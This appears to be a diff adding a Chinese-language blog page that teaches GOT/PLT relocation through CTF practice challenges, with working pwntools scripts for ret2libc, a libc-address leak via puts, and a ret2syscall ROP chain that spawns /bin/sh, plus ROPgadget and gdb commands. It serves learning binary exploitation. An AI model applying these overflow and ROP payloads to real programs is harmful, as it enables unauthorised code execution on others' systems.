@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#d8f3ff">
+<title>从ret2libc中学习GOT表和PLT表以及动态计算偏移</title>
+
+  <style>
+    :root { --wallpaper: url("/images/wallpaper.jpg"); }
+  </style>
+
+<link rel="stylesheet" href="/css/main.css">
+<script defer src="/js/main.js"></script>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<body class="theme-mac js is-article-page has-wallpaper">
+  <div class="menu-bar">
+  <div class="menu-left">
+    <div class="menu-apple" id="menu-apple">
+      <button class="menu-apple-btn" id="menu-apple-btn" type="button" aria-haspopup="true" aria-expanded="false" aria-label="Apple">
+        <svg class="menu-apple-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+          <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+        </svg>
+      </button>
+      <div class="menu-dropdown" id="menu-apple-dropdown" role="menu">
+        <button class="menu-dropdown-item" type="button" data-open="about">关于本机</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">系统设置...</button>
+        <button class="menu-dropdown-item" type="button">App Store...</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">关机...</button>
+      </div>
+    </div>
+    <span class="menu-item brand">Finder</span>
+    <span class="menu-item">File</span>
+    <span class="menu-item">Edit</span>
+    <span class="menu-item">View</span>
+    <span class="menu-item">Go</span>
+    <span class="menu-item">Window</span>
+    <span class="menu-item">Help</span>
+  </div>
+  <div class="menu-right">
+    <span class="menu-item status icon" aria-label="WeChat" title="WeChat">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M8.5 6.5c-3.2 0-5.8 2.1-5.8 4.8 0 1.7 1 3.3 2.6 4.2l-.6 2.3 2.3-1.2c.5.1 1 .2 1.5.2 3.2 0 5.8-2.1 5.8-4.8S11.7 6.5 8.5 6.5z"/>
+        <path d="M15.5 11c3.1 0 5.7 2.1 5.7 4.7 0 1.5-.8 2.9-2.2 3.8l.5 2-2.1-1.1c-.4.1-.9.1-1.4.1-3.1 0-5.7-2.1-5.7-4.7S12.4 11 15.5 11z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="QQ" title="QQ">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 18c-1.4 0-2.6 1-2.6 2.3 0 1.1 1 2.1 2.6 2.1h10c1.6 0 2.6-1 2.6-2.1 0-1.3-1.2-2.3-2.6-2.3"/>
+        <path d="M6.5 12.5c-1.2 2.1-1.7 4.2-1.7 5.5M17.5 12.5c1.2 2.1 1.7 4.2 1.7 5.5"/>
+        <path d="M12 4.2c-3.6 0-6.5 3-6.5 6.7 0 3.7 2.9 6.7 6.5 6.7s6.5-3 6.5-6.7c0-3.7-2.9-6.7-6.5-6.7z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Bluetooth" title="Bluetooth">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 6l10 10-5 4V4l5 4-10 10"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Wi-Fi" title="Wi-Fi">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M3.5 9.5a12 12 0 0 1 17 0"/>
+        <path d="M6.8 12.8a7.2 7.2 0 0 1 10.4 0"/>
+        <path d="M10.4 16.4a2.6 2.6 0 0 1 3.2 0"/>
+        <circle cx="12" cy="19" r="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Battery" title="Battery">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <rect x="3" y="7.5" width="16" height="9" rx="2"/>
+        <rect x="19" y="10" width="2" height="4" rx="1"/>
+        <rect x="5.2" y="9.6" width="11.4" height="4.8" rx="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item" id="menu-time">--:--</span>
+  </div>
+</div>
+
+
+  <main class="desktop">
+    <div class="window wide reveal" style="--delay: 120ms;">
+      <div class="window-bar">
+        <div class="traffic">
+          <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+          <span class="traffic-dot yellow"></span>
+          <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+        </div>
+        <div class="window-title">从ret2libc中学习GOT表和PLT表以及动态计算偏移</div>
+        <div class="window-actions">
+          <a class="window-link" href="/">Desktop</a>
+          
+          
+            <a class="window-link" href="/2019/09/18/%E4%B9%8B%E5%89%8D%E7%9A%84/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/" target="_blank" rel="noopener">Share</a>
+          
+        </div>
+      </div>
+      <div class="window-body">
+        
+        <div class="article-head">
+          <h1 class="article-title">从ret2libc中学习GOT表和PLT表以及动态计算偏移</h1>
+          
+            <div class="article-meta">2019-09-18</div>
+          
+        </div>
+        <article class="markdown">
+          <h3 id="所谓教材-就是把一个简单易懂的名词-扩写成一堆谁也看不懂的句子（假的"><a href="#所谓教材-就是把一个简单易懂的名词-扩写成一堆谁也看不懂的句子（假的" class="headerlink" title="所谓教材:就是把一个简单易懂的名词,扩写成一堆谁也看不懂的句子（假的"></a>所谓教材:就是把一个简单易懂的名词,扩写成一堆谁也看不懂的句子（假的</h3><h4 id="1-重定位"><a href="#1-重定位" class="headerlink" title="1.重定位"></a>1.重定位</h4><p>确定程序运行时地址的过程就是这里重定位(Relocation)。</p>
+<h4 id="2-链接时重定位"><a href="#2-链接时重定位" class="headerlink" title="2.链接时重定位"></a>2.链接时重定位</h4><p>链接阶段是将一个或多个中间文件(.o文件)通过链接器将它们链接成一个可执行文件，主要做的事情有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对各个中间文件的同名section进行合并</span><br><span class="line">对代码段，数据段等进行地址分配</span><br><span class="line">进行链接时重定位</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+
+<p>两种情况：</p>
+<p>1.如果是在其他中间文件中已经定义了的函数，链接阶段可以直接重定位到函数地址<br>2.如果是在动态库中定义了的函数，链接阶段无法直接重定位到函数地址，只能生成额外的小片段代码，也就是PLT表，然后重定位到该代码片段</p>
+<h4 id="3、运行时重定位"><a href="#3、运行时重定位" class="headerlink" title="3、运行时重定位"></a>3、运行时重定位</h4><p>运行后加载动态库，把动态库中的相应函数地址填入GOT表，由于PLT表是跳转到GOT表的，这就构成了运行时重定位</p>
+<h4 id="4、PLT表和GOT表"><a href="#4、PLT表和GOT表" class="headerlink" title="4、PLT表和GOT表"></a>4、PLT表和GOT表</h4><p>动态编译其实就是在实际内存中一份，但是在各进程的虚拟地址中“虚拟”一份，这样可以大大节省空间，但是这样会导致重定位非常困难，一个解决方法是给一种动态库一个确定的虚拟内存区，但是这样肯定是不行的（如果动态库很多，内存爆了233，所以有这么一个位置无关代码（PIC），而PLT表和GOT表就是用来无论这个动态库丢内存哪个区域都能调用到。有一个原则是代码段（PLT表）原则上是不能修改的，只能改数据段（GOT表）<br>ELF将GOT拆为了两个表叫做“.got”,”.got.plt”。其中 .got 用来保存全局变量的引用地址，.got.plt 用来保存函数引用的地址<br><img src="/2019/09/18/%E4%B9%8B%E5%89%8D%E7%9A%84/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/1.webp"></p>
+<h5 id="萌新问题1、不要GOT表可不可以"><a href="#萌新问题1、不要GOT表可不可以" class="headerlink" title="萌新问题1、不要GOT表可不可以"></a>萌新问题1、不要GOT表可不可以</h5><p><code> 意思是plt表直接保存</code>jmp *地址<code>肯定是不行的，因为plt是代码段，我们尽量不让他修改</code></p>
+<h5 id="萌新问题2、不要PLT表可不可以"><a href="#萌新问题2、不要PLT表可不可以" class="headerlink" title="萌新问题2、不要PLT表可不可以"></a>萌新问题2、不要PLT表可不可以</h5><p><code>也是不行的，因为GOT表是数据段，不能实现函数跳转等操作</code><br>当然延迟绑定的实现具体细节还是很复杂但是很精妙的，感兴趣可以看看程序员自我修养。</p>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc1 --string &#x27;/bin/sh&#x27;   </span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/18/%E4%B9%8B%E5%89%8D%E7%9A%84/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/2.png"><br>payload的布局结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A*N + system_addr + fake_ret + system_arg</span><br></pre></td></tr></table></figure>
+<p>fake_ret是下一次调用的返回地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>该题目与例 1 基本一致，只不过不再出现 &#x2F;bin&#x2F;sh 字符串，但是有一个puts函数，我们写到bss段，然后执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048490</span></span><br><span class="line">gets_addr=<span class="number">0x08048460</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buff2_addr=<span class="number">0x0804A080</span></span><br><span class="line"><span class="comment">#payload = flat([&quot;a&quot;*112,gets_addr,pop_ebx,buf2,system,&quot;aaaa&quot;,buf2])</span></span><br><span class="line">payload = flat([<span class="string">&quot;a&quot;</span>*<span class="number">112</span>,gets_addr,system,buff2_addr,buff2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>为甚么两个payload都可以呢<br>payload1:调用写函数之后，函数到了返回地址上，但是栈还多了上一次的参数buf2，所以我们找一个pop把栈平衡一下到达system函数调用，buf2重新作为参数，之后返回地址为“aaaa”,由于全程没动ebp，所以不需要管保留的ebp什么的<br>payload2:在 gets() 函数调用完后，在返回地址处覆盖上 system() 的地址将 gets() 函数的参数 buf 地址当成返回地址，再在后面加上 system() 函数的参数 buf。</p>
+<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>这题就要先泄露libc地址<br>思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.泄露 一个调用函数的 地址</span><br><span class="line"></span><br><span class="line">2.获取 libc 版本</span><br><span class="line"></span><br><span class="line">3.获取 system 地址与 /bin/sh 的地址</span><br><span class="line"></span><br><span class="line">4.再次执行源程序</span><br><span class="line"></span><br><span class="line">5.触发栈溢出执行 system(‘/bin/sh’)</span><br></pre></td></tr></table></figure>
+<p>获取libc版本使用LibcSearcher<br>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3=ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;main addr:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>])))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;plt puts addr:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>])))</span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x08048695&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*112+p32(ret2libc3.plt[&#x27;puts&#x27;])+p32(ret2libc3.symbols[&#x27;main&#x27;])+p32(ret2libc3.got[&#x27;puts&#x27;])</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>])+p32(ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>])+p32(ret2libc3.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">puts=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts addr:&quot;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;puts&#x27;,puts)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#print(&quot;libc version &quot;+str(libc))</span></span><br><span class="line">libcbase=puts-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(libc.symbols(&#x27;puts&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc base:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">bin_addr=libcbase+libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>() </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system addr :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_addr addr :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(bin_addr)))</span><br><span class="line">payload=<span class="string">&#x27;f&#x27;</span>*<span class="number">104</span>+p32(system_addr)+<span class="string">&#x27;bbbb&#x27;</span>+p32(bin_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#print(main)</span></span><br></pre></td></tr></table></figure>
+<p>解释<br>我们先找到puts函数的plt表，这样可以直接调用puts函数输出我们要看的东西<br>puts参数为<code>p32(ret2libc3.got[&#39;puts&#39;])</code>,我们在每次运行的时候把got表中的puts(其实是一个指针)，输出，这样就把puts函数在这个进程的虚拟地址输出了，然后在一个动态库中相对偏移是不变的，找到system和<code>&#39;/bin/sh&#39;</code>虚拟地址。<br>我们在输出的时候把返回地址设置为main函数就可以再次运行栈溢出而且动态库在虚拟地址中位置不变（Orz太精妙了</p>
+<h3 id="动态调整栈的长度"><a href="#动态调整栈的长度" class="headerlink" title="动态调整栈的长度"></a>动态调整栈的长度</h3><p>之前静态计算栈溢出的偏移，太难了容易算错，然后曹师傅说动态调试就简单了<br>1、先略微调高一点<br>2、设置断点在ret上<br>3、运行，断点截住后查看栈多出了多少<br>比如本题的104，先设置为110<br>然后发现多了6个f字符，所以实际偏移为110-6&#x3D;104<br><img src="/2019/09/18/%E4%B9%8B%E5%89%8D%E7%9A%84/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/3.png"></p>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell<br>其中，该程序是 32 位，所以我们需要使得</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure>
+<p>寻找 gadgets的方法，我们可以使用 ropgadgets 这个工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ps:几个DGB常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-q 参数不显示欢迎信息等</span><br><span class="line"></span><br><span class="line">-n 不加载任何插件，使用原生 gdb</span><br><span class="line"></span><br><span class="line">info 后面跟上想要查看的信息，如函数信息 info functions</span><br><span class="line"></span><br><span class="line">b/breakpoint 设置断点</span><br><span class="line"></span><br><span class="line">del/delete breakpoints n 删除断点，n是断点编号，可用info breakpoints命令查看断点信息</span><br><span class="line"></span><br><span class="line">start 命令启动程序并停在开辟完主函数栈帧的地方</span><br><span class="line"></span><br><span class="line">c/continue 继续执行程序，遇到断点停下</span><br><span class="line"></span><br><span class="line">f/finish 结束程序</span><br><span class="line"></span><br><span class="line">r/run 运行程序，遇到断点停下</span><br><span class="line"></span><br><span class="line">ni 单步步过，一步一步执行指令遇到函数调用时直接执行完整个函数</span><br><span class="line"></span><br><span class="line">si 单步步入，一步一步执行指令遇到函数调用时跳转到函数内部</span><br><span class="line"></span><br><span class="line">vmmap 查看内存映射</span><br><span class="line"></span><br><span class="line">checksec 查看程序的防护措施</span><br><span class="line"></span><br><span class="line">pdisass/disassemble 查看当前函数帧的反汇编代码，前一个命令有高亮显示只是需要安装pwndbg插件，后面一个命令时gdb自带的命令无高亮显示</span><br><span class="line"></span><br><span class="line">p/print 打印信息，如寄存器 p $ebp</span><br><span class="line"></span><br><span class="line">x/&lt;n/f/u&gt; &lt;addr&gt; 查看某地址处的值，n/f/u 参数为可选，n代表想要查看多少个内存单元即从当前地址开始计算，每个内存单元的大小由后面的u参数指定；f表示显示格式，如s表示字符串形式，i为指令形式；u指定内存单元大小，b(一个字节)、h(双字节)、w(四个字节)、g(八字节)默认为w； 后面跟上x代表以十六进制的形式查看变量</span><br><span class="line"></span><br><span class="line">set *addr = value 设置某个地址的值</span><br></pre></td></tr></table></figure>
+<p>ps:read函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read(int fd, void *buf, size_t count);</span><br></pre></td></tr></table></figure>
+<p>函数的参数【int fd】：这个是文件指针<br>函数的参数【void *buf】：读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移<br>函数的参数【size_t count】：是请求读取的字节数。若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0<br>read()会把参数fd 所指的文件传送count个字节到buf指针所指的内存中</p>
+
+        </article>
+      </div>
+    </div>
+  </main>
+
+  <section id="about" class="about-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">关于本机</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body about-body">
+      <div class="about-card">
+        <div class="about-brand">
+          <div class="about-logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+              <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+            </svg>
+          </div>
+          <div class="about-title">MacBook Pro</div>
+          <div class="about-sub">16-inch, 2099</div>
+        </div>
+        <div class="about-specs">
+          <div class="about-row">
+            <span class="about-key">内存</span>
+            <span class="about-val">256 GB 2667 MHz DDR4</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">处理器</span>
+            <span class="about-val">Apple M9 Pro</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">显卡</span>
+            <span class="about-val">Neural X 32-Core</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">序列号</span>
+            <span class="about-val">MACF-2099-A1B2C3</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">系统</span>
+            <span class="about-val">macOS 15.2</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">主题作者</span>
+            <span class="about-val">bkfish</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+  
+
+<section id="music" class="tool-window music-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">Music</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+        
+      </div>
+    </div>
+    <div class="window-body tool-body music-body">
+      
+        <div class="empty-state">
+          <div class="empty-title">未发现本地音乐</div>
+          <div class="empty-sub">把 MP3 放在 `source/music/`（或在主题配置里设置 `desktop.music_dir`）</div>
+        </div>
+      
+    </div>
+  </div>
+</section>
+
+  <section id="search" class="search-window" data-index-url="/mac-search.json">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
